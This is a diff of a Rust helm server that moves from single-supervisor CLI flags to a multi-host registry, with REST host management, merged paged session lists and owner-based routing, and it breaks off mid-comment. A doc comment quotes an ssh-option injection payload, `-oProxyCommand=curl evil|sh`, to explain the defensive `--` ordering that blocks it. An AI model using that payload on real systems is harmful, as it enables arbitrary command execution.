@@ -6,11 +6,40 @@
 //! and serves the UI and API over loopback HTTP/WS. It holds no
 //! authoritative session state — supervisors are the authority.
 //!
-//! Current scope: exactly one supervisor connection (local or one ssh
-//! host), chosen by CLI flags; the host registry and multi-host
-//! aggregation arrive with M6 (PLAN.md). The loopback-only bind is enforced here — SPEC.md's
-//! security posture says the helm refuses non-loopback addresses in v1,
-//! and this code simply never binds anything else.
+//! The loopback-only bind is enforced here — SPEC.md's security posture
+//! says the helm refuses non-loopback addresses in v1, and this code simply
+//! never binds anything else.
+//!
+//! ## The shape of the serving path (PLAN_M6.md item 5)
+//!
+//! Every request is answered against a FLEET, never against one
+//! connection. `AppState` holds two things: the [`manager::ConnectionManager`],
+//! which owns one connection actor per registered host and publishes each
+//! host's live state, and the [`store::HelmStore`], which holds the
+//! registry and the last-known session cache those actors drain into.
+//!
+//! Three consequences run through everything below:
+//!
+//! - **The session list is merged and paged.** [`aggregate::session_page`]
+//!   merges one indexed page of helm.db's cross-host cache with the rows a
+//!   connected host holds in the manager's memory when it has no identity
+//!   to bind a cache write to, tags each row with its host, marks rows of
+//!   non-connected hosts stale, and pages the result with a helm-level
+//!   cursor that is deliberately independent of the wire cursor underneath
+//!   it (see that module's docs).
+//! - **Session operations route by owner.** [`route_session`] looks a
+//!   session's host up in that same merged view and hands back the host's
+//!   LIVE connection — or refuses, naming the state the host is actually
+//!   in. Unreachable is not special-cased; it is one of six ways a host can
+//!   fail to be connected, and all six refuse identically.
+//! - **Hosts are managed over REST.** [`hosts`] is the registry's own
+//!   surface — add, retarget, remove, adopt, retry — and `--ensure-hosts`
+//!   ([`ensure`]) is the same registration path run once at startup.
+//!
+//! M1's argv session flags (`--ssh`, `--cwd`, `--agent`, `--title`,
+//! `--remote-farhelm`, `--remote-state-dir`) are gone in this same PR: the
+//! registry and the create API are the mechanism now, and the last two live
+//! on as per-host registry fields.
 
 use anyhow::Context;
 use axum::{
@@ -25,7 +54,6 @@ use farhelm_proto::{ErrorKind, TerminalSelector};
 use serde::Deserialize;
 use std::net::{Ipv4Addr, SocketAddr};
 use std::path::PathBuf;
-use std::process::Stdio;
 use std::sync::Arc;
 use tracing::{error, info, warn};
 
@@ -35,96 +63,95 @@ pub use client::{
     TermDetachSignal, TermEvent, TermStream,
 };
 
+/// The merged multi-host session list and the helm-level cursor that pages
+/// it — what `GET /api/sessions` is built out of.
+mod aggregate;
+
+/// `--ensure-hosts`: the JSON5 floor under the registry, applied once
+/// before serving starts.
+mod ensure;
+
+/// `/api/hosts` — the registry's REST surface, and the JSON shape a UI
+/// renders a host chip from.
+mod hosts;
+
 /// The per-host connection actors, their reconnect state machine, and the
 /// cache refresh that rides them (PLAN_M6.md item 4).
 ///
-/// Deliberately NOT wired into the serving path below: `AppState`'s single
-/// client is still what answers every request in this milestone step, and
-/// PLAN_M6.md's order of work puts aggregation and REST host management in
-/// the next PR. The module is public because that PR — and the desktop
-/// embedder after it — are its consumers.
+/// Public because the desktop embedder drives one directly, and because the
+/// real-transport tests in `farhelm`'s e2e suite are written against it.
 pub mod manager;
 
 pub mod store;
+
+/// The scripted-fleet harness the REST tests in this crate stand a real
+/// serving path up on. Test-only, but its own module because three test
+/// modules share it.
+#[cfg(test)]
+mod rest_harness;
 
 #[cfg(test)]
 mod test_capture;
 
 /// CLI arguments for `farhelm helm run`. Lives here (not in the bin
 /// crate) so the helm's surface and its implementation evolve together.
+///
+/// M1's session and transport flags are deliberately absent (PLAN_M6.md
+/// item 5, user decision 2026-08-04). `--ssh`/`--remote-farhelm`/
+/// `--remote-state-dir` became per-host registry fields, and
+/// `--cwd`/`--agent`/`--title` became `POST /api/sessions` — a helm now
+/// drives every registered host at once, so an argv flag naming ONE of
+/// them could only ever have meant the wrong thing.
 #[derive(Args, Debug, Clone)]
 pub struct HelmArgs {
     /// Loopback port for the web UI and API.
     #[arg(long, default_value_t = 7433)]
     pub port: u16,
 
-    /// State directory (default: ~/.local/state/farhelm). Holds ssh
-    /// ControlMaster sockets; also locates the local supervisor's socket
-    /// when --ssh is not given.
+    /// State directory (default: ~/.local/state/farhelm). Holds helm.db,
+    /// the ssh ControlMaster sockets, and — in the ordinary single-machine
+    /// arrangement — the local supervisor's socket the reserved local host
+    /// row is reached through.
     #[arg(long)]
     pub state_dir: Option<PathBuf>,
-
-    /// SSH destination of the host to drive (e.g. user@host). Omit to
-    /// use a supervisor on this machine.
-    #[arg(long)]
-    pub ssh: Option<String>,
-
-    /// Command for the farhelm binary on the remote host.
-    #[arg(long, default_value = "farhelm")]
-    pub remote_farhelm: String,
-
-    /// State directory on the remote host (defaults to the remote's own
-    /// default). A `String`, not a `PathBuf`: this path is handed to the
-    /// remote shell as ssh argv text and never touches the local
-    /// filesystem, so there is no reason to parse it as a local path — and
-    /// `String` lets clap reject a non-UTF-8 value right here, before it
-    /// can survive to a lossy conversion deep in the ssh argv builder.
-    /// This is ssh's own textual boundary, not farhelm-proto's wire
-    /// contract: this string never crosses the protocol (contrast
-    /// `ControlMsg::CreateSession::cwd`, which does and has its UTF-8-only
-    /// contract documented in farhelm-proto's crate docs).
-    #[arg(long)]
-    pub remote_state_dir: Option<String>,
 
     /// Directory with the built web UI (index.html + assets). Without
     /// it the API still serves; the UI returns 404.
     #[arg(long)]
     pub ui_dist: Option<PathBuf>,
 
-    /// Create a session at startup in this working directory (on the
-    /// target host). PLAN_M1.md's argv-driven creation: these flags feed
-    /// the same creation API the UI will use, never a side door.
-    #[arg(long, requires = "agent")]
-    pub cwd: Option<String>,
-
-    /// Agent invocation for the startup session (e.g. "claude").
-    #[arg(long, requires = "cwd")]
-    pub agent: Option<String>,
-
-    /// Title for the startup session.
+    /// JSON5 file of hosts to guarantee are registered at startup:
+    /// `{ hosts: [ { ssh, remote_farhelm?, remote_state_dir? } ] }`.
+    ///
+    /// An additive floor over helm.db, applied before serving begins and
+    /// never consulted again — see `crate::ensure` for what it does and
+    /// does not promise. Built for half-automated setups and agent-driven
+    /// testing, where a fleet has to exist before anything can drive it.
     #[arg(long)]
-    pub title: Option<String>,
+    pub ensure_hosts: Option<PathBuf>,
 }
 
-/// What the axum handlers share. One supervisor client, because M1 drives
-/// exactly one host; M6's registry turns this into a map keyed by host id
-/// without the handlers changing shape.
+/// What the axum handlers share: the fleet, in its two halves.
+///
+/// The manager is authority for what each host is DOING right now (and
+/// holds the only live connections); the store is authority for what the
+/// registry says and for the last-known sessions every host's actor drains
+/// into it. Every handler below reaches for one or both, and none of them
+/// holds a connection of its own — see this crate's docs for why the
+/// single-client `AppState` this replaced could not survive multi-host.
 struct AppState {
-    client: Arc<SupervisorClient>,
+    manager: Arc<manager::ConnectionManager>,
+    store: store::HelmStore,
 }
 
 /// Assemble the routes, optional static UI service, and loopback-origin
 /// middleware that `run()` serves.
 ///
 /// Pulled out of `run()` so tests can drive the real middleware stack
-/// in-process (via `tower::ServiceExt::oneshot`) against a scripted
-/// `SupervisorClient`, instead of only exercising handlers directly and
-/// silently skipping the origin guard and its response headers.
-fn build_router(
-    client: Arc<SupervisorClient>,
-    ui_dist: Option<&std::path::Path>,
-    port: u16,
-) -> Router {
+/// in-process (via `tower::ServiceExt::oneshot`) against a scripted fleet,
+/// instead of only exercising handlers directly and silently skipping the
+/// origin guard and its response headers.
+fn build_router(state: Arc<AppState>, ui_dist: Option<&std::path::Path>, port: u16) -> Router {
     let mut app = Router::new()
         .route("/api/sessions", get(list_sessions).post(create_session))
         .route("/api/sessions/{id}/stop", axum::routing::post(stop_session))
@@ -164,7 +191,26 @@ fn build_router(
                 .layer(axum::middleware::from_fn(attachment_cors)),
         )
         .route("/api/sessions/{id}/term", get(term_ws))
-        .with_state(Arc::new(AppState { client }));
+        // Host management (PLAN_M6.md item 5). The two verb routes are
+        // shaped like the session verbs (`/stop`, `/rename`) rather than as
+        // PATCHes, for the reason `rename_session` records: each changes
+        // exactly one thing, and naming the thing is clearer than inventing
+        // a partial-update shape this API has nowhere else.
+        .route("/api/hosts", get(hosts::list_hosts).post(hosts::add_host))
+        .route("/api/hosts/{id}", axum::routing::delete(hosts::remove_host))
+        .route(
+            "/api/hosts/{id}/destination",
+            axum::routing::post(hosts::set_destination),
+        )
+        .route(
+            "/api/hosts/{id}/adopt",
+            axum::routing::post(hosts::adopt_host),
+        )
+        .route(
+            "/api/hosts/{id}/retry",
+            axum::routing::post(hosts::retry_host),
+        )
+        .with_state(state);
 
     if let Some(dist) = ui_dist {
         let serve = tower_http::services::ServeDir::new(dist).fallback(
@@ -180,14 +226,24 @@ fn build_router(
     ))
 }
 
-/// Run the helm until the process is killed: connect to the one
-/// supervisor, optionally create the argv-specified startup session, and
-/// serve the API and UI on loopback.
+/// Run the helm until the process is killed: open helm.db, apply any
+/// `--ensure-hosts` floor, start a connection actor per registered host,
+/// and serve the API and UI on loopback.
 ///
-/// Startup order is deliberate and worth preserving. The listener is bound
-/// before anything is created on a host, so the likely failure (port busy
-/// because a helm is already running) happens before a session exists; the
-/// reverse order would strand a live agent on every failed retry.
+/// Startup order is deliberate at three points, each for a different
+/// reason:
+///
+/// - The listener is bound FIRST, so the likely failure (port busy because
+///   a helm is already running) happens before anything else has been set
+///   up or written.
+/// - `--ensure-hosts` is ingested BEFORE the manager starts, so the
+///   guaranteed hosts have actors from the first moment rather than after a
+///   reconcile — and so a bad file fails startup before anything is
+///   serving. See [`ensure::ingest`] for its all-or-nothing contract.
+/// - The manager returns as soon as its actors are SPAWNED, not once they
+///   have connected. A down host must never delay the helm's startup: it is
+///   simply a host in a non-connected state, which the API exposes for the
+///   forthcoming UI to draw.
 ///
 /// Returns only on a fatal error. There is no graceful-shutdown path, and
 /// none is needed: SPEC.md's whole durability promise is that killing the
@@ -197,7 +253,7 @@ pub async fn run(args: HelmArgs) -> anyhow::Result<()> {
         Some(dir) => dir,
         None => farhelm_supervisor::default_state_dir()?,
     };
-    // 0700: this directory holds ssh ControlMaster sockets.
+    // 0700: this directory holds helm.db and ssh ControlMaster sockets.
     farhelm_supervisor::ensure_private_dir(&state_dir).await?;
 
     // Bind before creating anything on a host. A busy port is the likely
@@ -215,17 +271,22 @@ pub async fn run(args: HelmArgs) -> anyhow::Result<()> {
         .local_addr()
         .context("reading bound helm address")?;
 
-    let client = connect_supervisor(&args, &state_dir).await?;
-
-    if let (Some(cwd), Some(agent)) = (&args.cwd, &args.agent) {
-        let session = client
-            .create_session(cwd, agent, args.title.clone(), 80, 24)
-            .await
-            .context("creating startup session")?;
-        info!(id = %session.id, title = %session.title, "startup session created");
+    let store = store::HelmStore::open(&state_dir.join("helm.db")).await?;
+    if let Some(path) = args.ensure_hosts.as_deref() {
+        ensure::ingest(&store, path).await?;
     }
+    let manager = manager::ConnectionManager::start(
+        store.clone(),
+        Arc::new(manager::SystemTransport::new(&state_dir)),
+        manager::Cadence::default(),
+    )
+    .await?;
 
-    let app = build_router(client, args.ui_dist.as_deref(), addr.port());
+    let app = build_router(
+        Arc::new(AppState { manager, store }),
+        args.ui_dist.as_deref(),
+        addr.port(),
+    );
 
     // Printed on stdout, not logged: the README tells the user to open
     // this URL, and tracing goes to stderr behind an env filter.
@@ -455,8 +516,9 @@ async fn attachment_preflight() -> axum::response::Response {
 ///
 /// **`--` goes before the DESTINATION, not after it**, and that ordering is
 /// a security boundary rather than a stylistic choice. A destination is
-/// user-supplied text (M1's `--ssh` argument, and from M6 a registry row
-/// anyone with helm access can write), so a value shaped like
+/// user-supplied text — a registry row anyone with helm access can write,
+/// through `POST /api/hosts` or an `--ensure-hosts` file — so a value
+/// shaped like
 /// `-oProxyCommand=curl evil|sh` is parsed by OpenSSH's own getopt loop as
 /// an OPTION and executed — a local command injection with no ssh
 /// connection involved at all — for as long as the option terminator sits
@@ -468,9 +530,11 @@ async fn attachment_preflight() -> axum::response::Response {
 /// clear error instead of a puzzling ssh failure; THIS ordering is the
 /// actual guard, and it holds for callers that never go through the store.
 ///
-/// The UTF-8 requirement enforced below is specific to this ssh path;
-/// local-only mode (no `--ssh`) keeps native `OsString` state paths and
-/// still tolerates non-UTF-8 homes (see `farhelm_supervisor::default_state_dir`).
+/// The UTF-8 requirement enforced below is specific to this ssh path; the
+/// local host's unix-socket transport keeps native `OsString` state paths
+/// and still tolerates non-UTF-8 homes (see
+/// `farhelm_supervisor::default_state_dir`), so a helm with no ssh rows
+/// never meets this requirement at all.
 fn ssh_args(
     dest: &str,
     control_path: &std::path::Path,
@@ -547,51 +611,6 @@ fn ssh_control_path_option(raw: &str) -> String {
     format!("ControlPath=\"{escaped}{suffix}\"")
 }
 
-/// Establish the supervisor transport per flags: ssh exec channel when
-/// --ssh is given, the local unix socket otherwise. Both produce the
-/// same reader/writer pair — transport-blind from here on.
-async fn connect_supervisor(
-    args: &HelmArgs,
-    state_dir: &std::path::Path,
-) -> anyhow::Result<Arc<SupervisorClient>> {
-    match &args.ssh {
-        None => {
-            let stream = farhelm_supervisor::service::connect(state_dir).await?;
-            let (r, w) = tokio::io::split(stream);
-            SupervisorClient::start(r, w).await
-        }
-        Some(dest) => {
-            let control_path = state_dir.join("ssh-cm-%C");
-            let mut cmd = tokio::process::Command::new("ssh");
-            cmd.args(ssh_args(
-                dest,
-                &control_path,
-                &args.remote_farhelm,
-                args.remote_state_dir.as_deref(),
-            )?);
-            // stderr inherits: ssh's own diagnostics (auth failures,
-            // unreachable host) go to the user's terminal untouched —
-            // they are the actionable error SPEC.md wants surfaced.
-            let mut child = cmd
-                .stdin(Stdio::piped())
-                .stdout(Stdio::piped())
-                .kill_on_drop(true)
-                .spawn()
-                .context("spawning ssh")?;
-            let stdout = child.stdout.take().expect("piped stdout");
-            let stdin = child.stdin.take().expect("piped stdin");
-            // The child handle is parked in a reaper task: if ssh dies,
-            // the frame reader sees EOF and the client surfaces it.
-            tokio::spawn(async move {
-                let _ = child.wait().await;
-            });
-            SupervisorClient::start(stdout, stdin)
-                .await
-                .map_err(|e| annotate_ssh_handshake_eof(e, dest, args.remote_state_dir.as_deref()))
-        }
-    }
-}
-
 /// Turn "the ssh channel closed before the handshake finished" into
 /// something that names the CANDIDATE causes instead of just the symptom.
 ///
@@ -601,7 +620,7 @@ async fn connect_supervisor(
 /// dials the local supervisor socket before it speaks a word of the wire
 /// protocol, so a host with no supervisor bound makes the proxy exit
 /// immediately — and the remote's own `Error: ... Connection refused`
-/// reaches the operator only as inherited ssh stderr, disconnected from
+/// reaches the operator only as relayed ssh stderr, disconnected from
 /// this side's `anyhow` chain. The other: ssh itself never got as far as
 /// running anything (auth refused, host unresolvable, `remote_farhelm`
 /// missing), which also closes the channel with zero bytes spoken. Both
@@ -616,7 +635,8 @@ async fn connect_supervisor(
 /// refused, a decode failure) already carries its own accurate message and
 /// passes through untouched.
 ///
-/// `remote_state_dir` mirrors `--remote-state-dir` so the suggested
+/// `remote_state_dir` is the registry row's own field (M1's
+/// `--remote-state-dir`, now per-host), passed through so the suggested
 /// command is one the operator can paste: a supervisor started without it
 /// binds a socket the remote proxy will not dial.
 fn annotate_ssh_handshake_eof(
@@ -644,30 +664,299 @@ fn annotate_ssh_handshake_eof(
     e.context(format!(
         "the ssh channel to {dest} closed before the handshake completed: either no supervisor \
          is running on {dest} (start one there with `{remedy}`), or the ssh connection itself \
-         failed — ssh reports its own errors on stderr, which a direct `--ssh` connection prints \
-         above and a registered host relays into the helm's log"
+         failed — ssh reports its own errors on stderr, which the connection manager relays \
+         into the helm's log for this host"
     ))
 }
 
-/// `GET /api/sessions` — the full `SessionListing` as JSON:
-/// `{"sessions": [...], "total": N, "truncated": bool}` (PLAN_M2.md step
-/// 6). This is a breaking shape change from M1's bare array, so this PR
-/// also updates the UI's `fetch_sessions` (farhelm-ui/src/lib.rs) in the
-/// same change — the object shape itself, and the `sessions` key
-/// specifically, are load-bearing for that caller today. `total` and
-/// `truncated` are threaded through the wire here but not yet consumed
-/// by the production UI (the tests here and in Playwright do read them):
-/// they are the contract the next PR's list UI ("showing N of M") builds
-/// against. The helm caches
-/// nothing before M6; supervisors are the authority (SPEC.md). The
-/// last-known-session cache that survives helm restarts arrives with
-/// M6's registry and stale-cache semantics (PLAN.md) — with one
-/// always-connected supervisor there is nothing for a cache to add.
-async fn list_sessions(State(state): State<Arc<AppState>>) -> impl IntoResponse {
-    match state.client.list_sessions().await {
-        Ok(listing) => axum::Json(listing).into_response(),
+/// Query parameters for `GET /api/sessions` — the helm-level page walk
+/// (PLAN_M6.md item 5).
+///
+/// Both absent is a fresh walk of the first [`aggregate::DEFAULT_PAGE_LIMIT`]
+/// entries, which is what every pre-M6 caller sends and what the UI in this
+/// tree still sends. That is the whole compatibility story for this route's
+/// query string: it gained two optional parameters and no required one.
+#[derive(Deserialize)]
+struct ListQuery {
+    /// An opaque resume key from a previous reply's `next_cursor`. Replay
+    /// it verbatim; never construct or interpret one. An undecodable value
+    /// is a 400 rather than a silent restart from the front, because a
+    /// restart would re-serve a page the caller already had while looking
+    /// exactly like progress.
+    cursor: Option<String>,
+    /// Maximum entries in this page. Deliberately uncapped: the merged list
+    /// is local data this process has already read, so a large page costs
+    /// serialization rather than a fan-out of host round trips. A limit of
+    /// zero is refused — it could never make progress through the pages.
+    limit: Option<usize>,
+}
+
+/// `GET /api/sessions` — one page of the MERGED, multi-host session list
+/// (PLAN_M6.md item 5).
+///
+/// The rows are every registered host's sessions in one creation-time
+/// order, each tagged with the host it lives on and marked `stale` when
+/// that host is not currently connected — SPEC.md's "sessions on an
+/// unreachable host stay in the list, clearly marked" is this handler plus
+/// the cache behind it, and nothing else.
+///
+/// The body keeps its M2 shape (`sessions`/`total`/`truncated`) with the
+/// host fields added to each row and `next_cursor` added alongside, so the
+/// UI that predates multi-host keeps decoding it unchanged. `total` now
+/// counts the merged view rather than one supervisor's list, and
+/// `truncated` now means "there is a next page" rather than "entries were
+/// held back" — see [`aggregate::SessionPageBody`] for both.
+///
+/// Served from what the helm has already RECORDED, never by asking hosts
+/// (see [`aggregate`]'s module docs for why the two cursor layers are
+/// decoupled): helm.db for every host that caches, and the manager's
+/// in-memory list for a connected host that has no identity to bind a cache
+/// write to. Either way nothing here makes a network call, so a slow or
+/// flapping host cannot slow a list poll down.
+///
+/// One consequence is worth stating rather than discovering: a session
+/// created on ANOTHER client appears here only after its host's next
+/// refresh, so this list trails such a create by up to one refresh
+/// interval. A session created through this helm is recorded by the create
+/// itself, and is routable immediately either way — routing does not go
+/// through this handler.
+async fn list_sessions(
+    State(state): State<Arc<AppState>>,
+    Query(q): Query<ListQuery>,
+) -> impl IntoResponse {
+    let limit = match q.limit {
+        None => aggregate::DEFAULT_PAGE_LIMIT,
+        Some(0) => {
+            return http_error(anyhow::Error::new(SupervisorError {
+                kind: ErrorKind::InvalidRequest,
+                message: "session list limit must be at least 1; a limit of 0 could never make \
+                          progress through the pages"
+                    .to_string(),
+            }));
+        }
+        Some(limit) if limit > crate::aggregate::MAX_PAGE_LIMIT => {
+            return http_error(anyhow::Error::new(SupervisorError {
+                kind: ErrorKind::InvalidRequest,
+                message: format!(
+                    "session list limit must be at most {}; a page is real work on this side, \
+                     and an unbounded one is a request to do all of it at once",
+                    crate::aggregate::MAX_PAGE_LIMIT
+                ),
+            }));
+        }
+        Some(limit) => limit,
+    };
+    match aggregate::session_page(&state.manager, &state.store, q.cursor.as_deref(), limit).await {
+        Ok(page) => axum::Json(page).into_response(),
         Err(e) => http_error(e),
     }
+}
+
+/// Find the live connection for the host that owns `session_id`, or refuse
+/// naming the state that host is actually in (PLAN_M6.md item 5).
+///
+/// The single owner-lookup path every session operation goes through. Two
+/// properties are the whole point:
+///
+/// - **The state and the client are read TOGETHER**, from one borrow of the
+///   actor's published status ([`manager::ConnectionManager::status`]). Two
+///   separate reads can straddle a transition and hand back a fresh
+///   `Connected` beside a `None` client, or a live-looking client beside a
+///   dead state — which is exactly how an operation gets routed onto a
+///   corpse.
+/// - **Every non-connected state refuses identically**, with the state
+///   named. Unreachable is not special; it is merely the common case. A
+///   skewed, mismatched, duplicate, or retired host refuses the same way,
+///   because the alternative is a caller that handles four of the six and
+///   silently mis-handles the rest. Nothing queues — SPEC.md v1 refuses
+///   rather than deferring.
+///
+/// A session nothing knows about is a 404. A session created HERE is
+/// routable immediately — `create_session` seeds it into its host's cache
+/// in the same handler — so that 404 means "no host has ever reported this
+/// id", not "you were too quick". A session created by another client on
+/// another host is the one case that waits, for up to one refresh interval,
+/// which is the price of a list that never fans out to N hosts per request.
+async fn route_session(
+    state: &AppState,
+    session_id: &str,
+) -> anyhow::Result<(manager::SessionClaim, Arc<SupervisorClient>)> {
+    let (host, status) = resolve_owner(state, session_id).await?;
+    // The claim comes out of the SAME status this routed by, so an
+    // operation whose reply is recorded afterwards (restart, rename) files
+    // it against the connection it actually used — see
+    // `manager::SessionClaim`.
+    let identity = match &status.state {
+        manager::HostState::Connected { identity, .. } => identity.clone(),
+        _ => None,
+    };
+    let claim = manager::SessionClaim {
+        host,
+        incarnation: status.incarnation,
+        identity,
+    };
+    let client = status.client.ok_or_else(|| {
+        anyhow::Error::new(SupervisorError {
+            kind: ErrorKind::Conflict,
+            message: refusal_text(host, &status.state),
+        })
+    })?;
+    Ok((claim, client))
+}
+
+/// Which host owns `session_id`, and that host's live status — read
+/// together, from the two places a session can be known.
+///
+/// helm.db answers for every host that caches; the manager's in-memory
+/// lists answer for a connected host that reports no identity and has none
+/// on record, which therefore caches nothing (see
+/// [`manager::HostSnapshot::live_sessions`]). Both are consulted because
+/// either alone leaves a whole class of session unroutable: without the
+/// first, nothing survives a helm restart; without the second, an
+/// identity-less host reads as connected and empty while its sessions are
+/// unreachable.
+///
+/// The in-memory lookup and the status it returns come from ONE hold of the
+/// manager's actor map ([`manager::ConnectionManager::live_owner`]), not
+/// from a snapshot followed by a second call. Split across two reads, a
+/// reconnect landing in between pairs one install's session claim with the
+/// next install's client — the same hazard the status accessor exists to
+/// prevent for the cached case, and it deserves the same answer rather than
+/// a second, weaker one.
+///
+/// The lookup is deliberately independent of whether the session's cached
+/// METADATA still decodes: routing asks where to send an operation, not
+/// what the session is, so a poisoned `info_json` must not make a live
+/// session unreachable.
+///
+/// FAILS CLOSED where two hosts claim one id, with the ambiguity named —
+/// including a collision a create discovered and recorded
+/// ([`AppState::contested_sessions`]). helm.db makes that unconstructible
+/// within itself, but a create can still mint an id another host already
+/// holds, and picking one would mean a stop aimed at one machine landing on
+/// another. A contested entry clears itself as soon as the fleet agrees
+/// again, so a collision that resolved needs no intervention.
+async fn resolve_owner(
+    state: &AppState,
+    session_id: &str,
+) -> anyhow::Result<(crate::store::HostId, manager::HostStatus)> {
+    // Contested claims come first, from live refresh state rather than a
+    // remembered incident: a host that STILL reports an id another host's
+    // cache holds is a standing disagreement, and there is no honest owner
+    // to route to while it stands. A claimant that stopped reporting the
+    // id, was removed, or had its cache purged by an adoption is simply not
+    // in this answer — the contest clears itself with the evidence that
+    // made it.
+    let contested = state.manager.contested_claimants(session_id);
+    let cached = state.store.host_of_session(session_id).await?;
+    if let Some(claimant) = contested.first()
+        && let Some(owner) = cached
+        && owner != *claimant
+    {
+        return Err(anyhow::Error::new(
+            crate::store::HostStoreError::SessionOwnerAmbiguous {
+                session: session_id.to_string(),
+                first: owner.min(*claimant),
+                second: owner.max(*claimant),
+            },
+        ));
+    }
+
+    let live = state.manager.live_owner(session_id)?;
+    match (cached, live) {
+        (None, None) => Err(anyhow::Error::new(SupervisorError {
+            kind: ErrorKind::NotFound,
+            message: format!("no such session: {session_id}"),
+        })),
+        // The in-memory answer carries its own status from the same lock
+        // hold, so it is used as it stands rather than looked up again.
+        (None, Some((host, status))) => Ok((host, status)),
+        (Some(host), Some((live_host, _))) if host != live_host => Err(anyhow::Error::new(
+            crate::store::HostStoreError::SessionOwnerAmbiguous {
+                session: session_id.to_string(),
+                first: host.min(live_host),
+                second: host.max(live_host),
+            },
+        )),
+        (Some(host), _) => {
+            let status = state.manager.status(host).ok_or_else(|| {
+                anyhow::Error::new(SupervisorError {
+                    kind: ErrorKind::Conflict,
+                    message: format!(
+                        "session {session_id} lives on host {host}, which is no longer registered"
+                    ),
+                })
+            })?;
+            // RE-READ the cached owner after capturing the status, and
+            // refuse if it moved. An adoption landing between the two reads
+            // purges one host's cache and connects another, so the pair
+            // taken naively can be "host A owns it" beside "host B's live
+            // connection" — an operation sent to the wrong machine, with
+            // nothing about either read looking wrong. Refusing is the only
+            // safe answer available at this layer: the caller retries and
+            // gets a coherent pair.
+            let still = state.store.host_of_session(session_id).await?;
+            if still != Some(host) {
+                return Err(anyhow::Error::new(SupervisorError {
+                    kind: ErrorKind::Conflict,
+                    message: format!(
+                        "session {session_id} changed hosts while this request was being routed; \
+                         retry it"
+                    ),
+                }));
+            }
+            Ok((host, status))
+        }
+    }
+}
+
+/// The refusal sentence a non-connected host produces, for a session
+/// operation and for a create alike.
+///
+/// Written once because SPEC.md requires the host's state to be IN the
+/// error and requires errors to be actionable: two hand-written versions
+/// would drift, and the one that drifted would be the one a user actually
+/// read. The phase label is the same vocabulary the hosts list chips and
+/// the log lines use ([`manager::HostState::phase`]), so a user comparing
+/// an error against the hosts panel sees the same word in both.
+fn refusal_text(host: crate::store::HostId, state: &manager::HostState) -> String {
+    let detail = match state {
+        manager::HostState::Connecting { last_error, .. } => last_error
+            .clone()
+            .unwrap_or_else(|| "the first connection attempt has not finished yet".to_string()),
+        manager::HostState::Unreachable { last_error, .. } => last_error.clone(),
+        manager::HostState::VersionSkew {
+            peer_protocol,
+            our_protocol,
+            remediation,
+            ..
+        } => format!(
+            "the host speaks protocol {peer_protocol} and this helm speaks {our_protocol}; \
+             {remediation}"
+        ),
+        manager::HostState::IdentityMismatch { recorded, reported } => format!(
+            "the host now reports identity {reported} where {recorded} was recorded; adopt the \
+             new identity or fix the destination"
+        ),
+        manager::HostState::IdentityUnverified { recorded } => format!(
+            "the host answered without an identity, so this helm cannot confirm it is still the \
+             install recorded as {recorded}; fix the host so it reports its identity, or \
+             retarget or remove this entry"
+        ),
+        manager::HostState::Duplicate { twin, .. } => {
+            format!("this entry duplicates host {twin}; edit or remove it")
+        }
+        manager::HostState::Retired { reason } => reason.clone(),
+        // Unreachable in practice — a connected host has a client and
+        // never reaches this function — but stated rather than
+        // `unreachable!()`: a panic on the refusal path would turn a
+        // routing race into a dropped connection.
+        manager::HostState::Connected { .. } => "the host connected while this was decided".into(),
+    };
+    format!(
+        "host {host} is {phase}, so this operation is refused and nothing was queued: {detail}",
+        phase = state.phase()
+    )
 }
 
 #[derive(Deserialize)]
@@ -675,6 +964,18 @@ struct CreateReq {
     cwd: String,
     invocation: String,
     title: Option<String>,
+    /// Which registered host to create on — a `HostView::id` from
+    /// `GET /api/hosts` (PLAN_M6.md item 5).
+    ///
+    /// Optional, defaulting to the reserved LOCAL row. That is the tail of
+    /// SPEC.md's own creation default ("the host of the currently open
+    /// session, else the helm's own host"): the first half needs to know
+    /// what the user is looking at and is therefore the client's to supply,
+    /// while the fallback is a server-side fact the helm can state itself.
+    /// Keeping it optional is also what leaves every hand-written caller —
+    /// a curl, a script, a test — meaning the obvious thing on a
+    /// single-machine setup.
+    host: Option<crate::store::HostId>,
     #[serde(default = "default_cols")]
     cols: u16,
     #[serde(default = "default_rows")]
@@ -721,9 +1022,173 @@ fn default_rows() -> u16 {
     24
 }
 
+/// The connection to create on: the body's `host`, or the reserved local
+/// row when the body named none (see [`CreateReq::host`]).
+///
+/// A create against a host in ANY non-connected state is a PRECONDITION
+/// FAILURE, exactly as SPEC.md's creation section demands — a visible error
+/// naming the host's state, and no session anywhere. It shares
+/// [`refusal_text`] with the lifecycle routes on purpose: "unreachable
+/// host" is listed in SPEC.md beside "nonexistent directory" as one of the
+/// preconditions that fail a create, and the five other non-connected
+/// states are the same failure with a different cause.
+async fn create_target(
+    state: &AppState,
+    host: Option<crate::store::HostId>,
+) -> anyhow::Result<(manager::SessionClaim, Arc<SupervisorClient>)> {
+    let snapshots = state.manager.snapshots();
+    let host =
+        match host {
+            Some(host) => host,
+            None => snapshots
+                .iter()
+                .find(|snapshot| snapshot.kind == crate::store::HostKind::Local)
+                .context(
+                    "this helm has no local host row, so a create naming no host has no default \
+                     target",
+                )?
+                .id,
+        };
+    let status = state.manager.status(host).ok_or_else(|| {
+        anyhow::Error::new(SupervisorError {
+            kind: ErrorKind::NotFound,
+            message: format!("no such host: {host}"),
+        })
+    })?;
+    // The claim is taken from the SAME read that produced the client, so
+    // the seed that follows can prove it is still talking about this
+    // connection — see `manager::SessionClaim`.
+    let identity = match &status.state {
+        manager::HostState::Connected { identity, .. } => identity.clone(),
+        // Unreachable in practice: a client is published exactly while the
+        // state is `Connected`, and the `ok_or_else` below is what turns
+        // every other state into a refusal. Written as a value rather than
+        // `unreachable!()` because a panic on the create path would be a
+        // far worse answer than a seed that later declines itself.
+        _ => None,
+    };
+    let claim = manager::SessionClaim {
+        host,
+        incarnation: status.incarnation,
+        identity,
+    };
+    let client = status.client.ok_or_else(|| {
+        anyhow::Error::new(SupervisorError {
+            kind: ErrorKind::Conflict,
+            message: refusal_text(host, &status.state),
+        })
+    })?;
+    Ok((claim, client))
+}
+
+/// Record what a host just told us about one session, where the serving
+/// path will find it.
+///
+/// Called by every mutation whose reply carries a fresh `SessionInfo`, and
+/// each has its own reason:
+///
+/// - **Create.** Without this a create is followed by a window — up to one
+///   refresh interval — in which every operation on the session it just
+///   returned 404s, because routing resolves owners from what the helm has
+///   recorded and the helm has recorded nothing yet. Not a theoretical gap:
+///   the create dialog's own flow is "create, then open the terminal",
+///   which lands in exactly that window.
+/// - **Restart and rename.** The list is served from what the helm has
+///   recorded, so a mutation whose result was not recorded leaves the row
+///   showing the PREVIOUS state for a poll interval. A user who restarts an
